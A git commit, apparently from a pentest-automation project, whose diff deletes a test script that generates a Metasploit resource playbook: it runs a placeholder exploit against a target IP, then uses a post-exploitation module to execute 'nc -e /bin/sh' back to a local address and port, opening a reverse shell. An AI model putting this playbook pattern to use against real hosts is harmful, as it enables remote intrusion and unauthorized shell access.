638cc7547b7556c967903458764383a61dc50fbf
Stefano Sesia <sesia.stefano@gmail.com>
2019-03-21 22:39:40 +0000

    refactoring

--- test.py
+++
@@ -1,9 +0,0 @@
-from TrivialFunctions import *
-target = "192.13.312.13"
-exploit = "test/test"
-localIP = "0.0.0.0"
-port = 6890
-name = "Playbooks/" + target.replace(".", "") + exploit.replace("/", "_") + ".rb"
-playbook = "use " + exploit + "\n" + "set rhost " + target + "\n" + "exploit -z\n" + "back\n" + "use post/multi/general/execute\n" + "set session 1\n" + "set command nc -e /bin/sh " + localIP + " " + str(
-    port) + "\n" + "run"
-writePlaybook(name, playbook)
